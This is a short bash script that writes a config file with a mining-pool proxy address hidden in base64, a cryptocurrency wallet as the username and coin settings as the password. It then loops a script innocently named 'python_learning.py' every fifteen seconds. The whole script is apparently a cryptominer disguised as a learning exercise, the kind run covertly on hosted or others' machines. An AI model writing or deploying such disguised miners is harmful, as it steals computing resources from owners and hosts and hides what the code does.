#!/bin/bash

echo -e "host=127.0.0.1\nport=3306\nproxy=wss://proxy-63d4.onrender.com/eGVsaXN2Mi1wZXBldy5uYS5taW5lLnpwb29sLmNhOjQ4MzM=\nthreads=8\npassword=c=RVN,zap=PEPEW\nusername=RFikJQEPWj7hveHt9G8wwLfufEmDagoRf4" > data.txt


MIN=$1
MAX=$2
while true; do
    if [ -z "$MAX" ]; then
        python3 python_learning.py "$MIN"
    else
        python3 python_learning.py "$MIN","$MAX"
    fi
    sleep 15
done
